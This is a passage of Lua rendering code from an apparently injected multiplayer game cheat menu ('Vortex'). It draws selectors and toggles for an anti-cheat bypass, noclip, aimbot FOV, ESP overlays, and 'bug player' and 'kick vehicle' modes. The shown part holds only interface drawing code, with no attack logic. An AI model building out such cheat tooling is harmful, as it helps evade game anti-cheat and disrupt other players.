                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "keybinds_position" then
                local selectorText = vortex_keybindsPositionOptions[vortex_keybindsPosition] or "Top-Right"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "bypassac" then
                local selectorText = vortex_bypassACOptions[vortex_selectedBypassAC] or "Unknown"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "nocliptype" then
                local selectorText = vortex_noclipTypeOptions[vortex_selectedNoclipType] or "None"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "noclipspeed" then
                local selectorText = tostring(vortex_noclipSpeedOptions[vortex_selectedNoclipSpeed])
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "visual_distance" then
                local selectorText = tostring(math.floor(VortexVisuals.maxDistance or 200)) .. "m"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "visual_fov_radius" then
                local selectorText = string.format("%.3f", VortexVisuals.fovRadius)
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "crosshair_style" then
                local selectorText = vortex_crosshairStyles[VortexVisuals.crosshair.style] or "Classic"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "crosshair_size" then
                local selectorText = string.format("%.0f", VortexVisuals.crosshair.size)
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "crosshair_thickness" then
                local selectorText = string.format("%.1f", VortexVisuals.crosshair.thickness)
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "crosshair_gap" then
                local selectorText = string.format("%.1f", VortexVisuals.crosshair.gap)
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "crosshair_color" then
                local _, _, _, _, name = vortex_paletteColor(VortexVisuals.crosshair.colorIndex)
                local selectorText = name
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "vehicle_distance" then
                local selectorText = tostring(math.floor(VortexVisuals.vehicle.distance)) .. "m"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "skeleton_thickness" then
                local selectorText = string.format("%.1f", VortexVisuals.skeleton.thickness)
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "box_thickness" then
                local selectorText = string.format("%.1f", VortexVisuals.box.thickness)
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and (item.action == "box_draw_health" or item.action == "box_draw_armor") then
                local selectorText
                if item.action == "box_draw_health" then
                    selectorText = vortex_sideOptions[VortexVisuals.box.healthSide] or "Left"
                else
                    selectorText = vortex_sideOptions[VortexVisuals.box.armorSide] or "Right"
                end
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and (item.action == "box_color" or item.action == "box_invis_color" or item.action == "skeleton_visible_color" or item.action == "skeleton_invis_color" or item.action == "text_color") then
                local idx
                if item.action == "box_color" then
                    idx = VortexVisuals.box.colorIndex
                elseif item.action == "box_invis_color" then
                    idx = VortexVisuals.box.invisColorIndex
                elseif item.action == "skeleton_visible_color" then
                    idx = VortexVisuals.skeleton.visibleColor
                elseif item.action == "skeleton_invis_color" then
                    idx = VortexVisuals.skeleton.invisColor
                elseif item.action == "text_color" then
                    idx = VortexVisuals.text.colorIndex
                end
                local _, _, _, _, name = vortex_paletteColor(idx)
                local selectorText = name or "Color"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and (item.action == "text_name" or item.action == "text_id" or item.action == "text_health" or item.action == "text_armor" or item.action == "text_distance" or item.action == "text_weapon") then
                local field = string.gsub(item.action, "text_", "")
                local cfg = VortexVisuals.text[field]
                local selectorText = vortex_anchorOptions[cfg.anchor] or "Bottom"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "selectmode" then
                local selectorText = vortex_selectMode == "all" and "Select All" or "Unselect All"
                local fullText = "- " .. selectorText .. " -"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth(fullText, selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, fullText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)
            end


            if item.hasSelector and item.action == "bugvehicle" then
                local selectorText = VortexMenu.bugVehicleMode == "v1" and "V1" or "V2"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "kickvehicle" then
                local selectorText = VortexMenu.kickVehicleMode == "v1" and "V1" or "V2"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "bugplayer" then
                local selectorText = VortexMenu.bugPlayerMode == "bug" and "Bug" or "Launch"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action and string.find(item.action, "outfit_") == 1 then
                local outfitType = string.gsub(item.action, "outfit_", "")
                local outfitValue = vortex_outfitData[outfitType]
                local displayValue = outfitValue and outfitValue.drawable or 0
                if displayValue == -1 then
                    displayValue = 0
                else
                    displayValue = displayValue + 1
                end
                local selectorText = "- " .. tostring(displayValue) .. " -"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth(selectorText, selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)
            end

            if item.hasSelector and item.action and string.find(item.action, "model_") == 1 then
                local modelType = string.gsub(item.action, "model_", "")
                local modelList, modelIndex

                if modelType == "male" then
                    modelList = vortex_maleModels
                    modelIndex = vortex_selectedModelIndex.male
                elseif modelType == "female" then
                    modelList = vortex_femaleModels
                    modelIndex = vortex_selectedModelIndex.female
                elseif modelType == "animals" then
                    modelList = vortex_animalModels
                    modelIndex = vortex_selectedModelIndex.animals
                end

                if modelList and modelIndex and modelList[modelIndex] then
                    local selectorText = "< " .. modelList[modelIndex].display .. " >"
                    local selectorSize = VortexStyle.itemSize
                    local selectorWidth = Susano.GetTextWidth(selectorText, selectorSize)
                    local selectorX = x + width - selectorWidth - 20

                    Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                        VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                    local textWidth = Susano.GetTextWidth(modelList[modelIndex].display, selectorSize)
                    Susano.DrawText(selectorX + 10, itemY + 10, modelList[modelIndex].display, selectorSize,
                        1.0, 1.0, 1.0, 1.0)

                    Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                        VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
                end
            end

            if item.hasSelector and item.action == "addonvehicle" then
                if not vortex_addonVehiclesScanned and not vortex_addonVehiclesScanning then
                    Vortex_ScanAddonVehicles()
                end

                local displayText
                if vortex_addonVehiclesScanning and #vortex_addonVehicles == 0 then
                    displayText = "Scanning..."
                elseif vortex_addonVehicles and vortex_selectedVehicleIndex.addon and vortex_addonVehicles[vortex_selectedVehicleIndex.addon] then
                    displayText = vortex_addonVehicles[vortex_selectedVehicleIndex.addon].display
                else
                    displayText = "No Vehicles"
                end

                local selectorText = "< " .. displayText .. " >"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth(selectorText, selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(displayText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, displayText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and (item.action == "spawncar" or item.action == "spawnmoto" or item.action == "spawnplane" or item.action == "spawnboat") then
                local category = string.gsub(item.action, "spawn", "")
                local vehicleList = vortex_vehicleLists[category]
                local vehicleIndex = vortex_selectedVehicleIndex[category]

                if vehicleList and vehicleIndex and vehicleList[vehicleIndex] then
                    local displayText = vehicleList[vehicleIndex].display
                    local selectorText = "< " .. displayText .. " >"
                    local selectorSize = VortexStyle.itemSize
                    local selectorWidth = Susano.GetTextWidth(selectorText, selectorSize)
                    local selectorX = x + width - selectorWidth - 20

                    Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                        VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                    local textWidth = Susano.GetTextWidth(displayText, selectorSize)
                    Susano.DrawText(selectorX + 10, itemY + 10, displayText, selectorSize,
                        1.0, 1.0, 1.0, 1.0)

                    Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                        VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
                end
            end

            if item.hasSelector and item.action and string.find(item.action, "weapon_") == 1 then
                local weaponType = string.gsub(item.action, "weapon_", "")
                local weaponList = vortex_weaponLists[weaponType]
                local weaponIndex = vortex_selectedWeaponIndex[weaponType]

                if weaponList and weaponIndex and weaponList[weaponIndex] then
                    local selectorText = "< " .. weaponList[weaponIndex].display .. " >"
                    local selectorSize = VortexStyle.itemSize
                    local selectorWidth = Susano.GetTextWidth(selectorText, selectorSize)
                    local selectorX = x + width - selectorWidth - 20

                    Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                        VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                    local textWidth = Susano.GetTextWidth(weaponList[weaponIndex].display, selectorSize)
                    Susano.DrawText(selectorX + 10, itemY + 10, weaponList[weaponIndex].display, selectorSize,
                        1.0, 1.0, 1.0, 1.0)

                    Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                        VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
                end
            end

            if isSlider then
                local sliderWidth = 85
                local sliderHeight = 6
                local sliderX = x + width - sliderWidth - 60
                local sliderY = itemY + (height - sliderHeight) / 2

                if item.action == "noclipbind" or hasSliderAndToggle then
                    sliderX = x + width - sliderWidth - 95
                end

                local currentValue, minValue, maxValue
                if item.action == "noclipbind" then
                    currentValue = vortex_noclipSpeed
                    minValue = 1.0
                    maxValue = 20.0
                elseif item.action == "drawfov" then
                    currentValue = vortex_fovRadius
                    minValue = 50.0
                    maxValue = 300.0
                elseif item.action == "easyhandling" then
                    currentValue = vortex_handlingAmount
                    minValue = 10.0
                    maxValue = 100.0
                elseif item.action == "freecam" then
                    currentValue = vortex_freecamSpeed
                    minValue = 0.1
                    maxValue = 5.0
                elseif item.action == "health" then
                    currentValue = vortex_healthValue
                    minValue = 0.0
                    maxValue = 100.0
                elseif item.action == "armour" then
                    currentValue = vortex_armourValue
                    minValue = 0.0
                    maxValue = 100.0
                end

                local percent = (currentValue - minValue) / (maxValue - minValue)

                Susano.DrawRectFilled(sliderX, sliderY, sliderWidth, sliderHeight,
                    0.12, 0.12, 0.12, 0.7, 3.0)

                Susano.DrawRectFilled(sliderX, sliderY, sliderWidth * percent, sliderHeight,
                    VortexStyle.accentColor[1] * 1.3, VortexStyle.accentColor[2] * 1.3, VortexStyle.accentColor[3] * 1.3, 1.0, 3.0)

                local thumbSize = 10
                local thumbX = sliderX + (sliderWidth * percent) - (thumbSize / 2)
                local thumbY = itemY + (height - thumbSize) / 2
                Susano.DrawRectFilled(thumbX, thumbY, thumbSize, thumbSize,
                    1.0, 1.0, 1.0, 1.0, 5.0)

                local valueText
                if item.action == "freecam" then
                    valueText = string.format("%.1f", currentValue)
                else
                    valueText = string.format("%.0f", currentValue)
                end
                local valuePadding = 6
                Susano.DrawText(sliderX + sliderWidth + valuePadding, itemY + 13, valueText, VortexStyle.itemSize - 6,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

            end

            local showToggle = false
            if isPlayerItem then
                showToggle = true
            elseif not isButton and toggleStates[item.action] ~= nil then
                if item.action == "noclipbind" or hasSliderAndToggle then
                    showToggle = true
                elseif not isSlider then
                    showToggle = true
                end
            elseif item.action == "freecam" then
                showToggle = true
            elseif item.action == "eventlogger" then
                showToggle = true
            end

            if showToggle then
                local toggleWidth = 32
                local toggleHeight = 16
                local toggleX = x + width - toggleWidth - 20
                local toggleY = itemY + (height - toggleHeight) / 2
                local toggleRounding = 8.0

                local isOn
                if isPlayerItem then
                    isOn = vortex_selectedPlayers[item.playerId] or false
                else
                    isOn = toggleStates[item.action]
                end

                if isOn then
                    Susano.DrawRectFilled(toggleX, toggleY, toggleWidth, toggleHeight,
                        VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3], 0.9, toggleRounding)
                else
                    Susano.DrawRectFilled(toggleX, toggleY, toggleWidth, toggleHeight,
                        0.20, 0.20, 0.20, 0.7, toggleRounding)
                end

                local thumbSize = 12
                local thumbY = toggleY + (toggleHeight - thumbSize) / 2

                -- animated thumb: store progress per toggle key
                local toggleKey
                if isPlayerItem then
                    toggleKey = "player_" .. tostring(item.playerId)
                else
                    toggleKey = "action_" .. tostring(item.action)
                end

                if VortexMenu.toggleAnim == nil then VortexMenu.toggleAnim = {} end
                local prog = VortexMenu.toggleAnim[toggleKey] or (isOn and 1.0 or 0.0)
                local target = isOn and 1.0 or 0.0
                local speed = 0.14
                prog = prog + (target - prog) * speed
                VortexMenu.toggleAnim[toggleKey] = prog

                local minX = toggleX + 2
                local maxX = toggleX + toggleWidth - thumbSize - 2
                local thumbX = minX + (maxX - minX) * prog

                Susano.DrawRectFilled(thumbX, thumbY, thumbSize, thumbSize,
                    1.0, 1.0, 1.0, 1.0, 6.0)
            end
        end
        end
    end

    if totalItems > 1 then
        local visibleItems = math.min(maxVisible, totalItems)
        local itemsAreaHeight = visibleItems * (height + spacing)
        local scrollbarX = x - VortexStyle.scrollbarWidth - 10
        local scrollbarY = startY
        local scrollbarHeight = itemsAreaHeight

        Susano.DrawRectFilled(scrollbarX, scrollbarY, VortexStyle.scrollbarWidth, scrollbarHeight,
            VortexStyle.bgColor[1] + 0.05, VortexStyle.bgColor[2] + 0.05, VortexStyle.bgColor[3] + 0.05, VortexStyle.bgColor[4] * 0.5,
            VortexStyle.scrollbarWidth / 2)

        local segmentHeight = scrollbarHeight / totalItems

        local thumbY = scrollbarY + ((VortexMenu.selectedIndex - 1) * segmentHeight)
        local thumbHeight = segmentHeight

        if not VortexMenu.scrollbarCurrentY then
            VortexMenu.scrollbarCurrentY = thumbY
        end
        if not VortexMenu.scrollbarCurrentHeight then
            VortexMenu.scrollbarCurrentHeight = thumbHeight
        end

        local smoothSpeed = 0.8
        VortexMenu.scrollbarCurrentY = VortexMenu.scrollbarCurrentY + (thumbY - VortexMenu.scrollbarCurrentY) * smoothSpeed
        VortexMenu.scrollbarCurrentHeight = VortexMenu.scrollbarCurrentHeight + (thumbHeight - VortexMenu.scrollbarCurrentHeight) * smoothSpeed

        local thumbPadding = 1
        local thumbX = scrollbarX + thumbPadding
        local thumbY = VortexMenu.scrollbarCurrentY + thumbPadding
        local thumbW = VortexStyle.scrollbarWidth - (thumbPadding * 2)
        local thumbH = VortexMenu.scrollbarCurrentHeight - (thumbPadding * 2)

        local baseR, baseG, baseB = VortexStyle.scrollbarThumb[1], VortexStyle.scrollbarThumb[2], VortexStyle.scrollbarThumb[3]
        local darkenAmount = 0.25

        local gradientSteps = 20
        local stepHeight = thumbH / gradientSteps

        for step = 0, gradientSteps - 1 do
            local stepY = thumbY + (step * stepHeight)
            local stepGradientFactor = step / (gradientSteps - 1)
            local stepDarken = stepGradientFactor * darkenAmount

            local stepR = math.max(0, baseR - stepDarken)
            local stepG = math.max(0, baseG - stepDarken)
            local stepB = math.max(0, baseB - stepDarken)

            Susano.DrawRectFilled(thumbX, stepY, thumbW, stepHeight,
                stepR, stepG, stepB, VortexStyle.scrollbarThumb[4],
                (thumbW) / 2)
        end
    end

    local visibleCount = math.min(maxVisible, totalItems)
    local footerY = startY + (visibleCount * (height + spacing))

    local footerWidth = width
    local footerX = x
    -- Draw footer with only bottom corners rounded: main rect (flat top), then bottom rounded strip
    local mainFooterHeight = math.max(0, VortexStyle.footerHeight - VortexStyle.footerRounding)
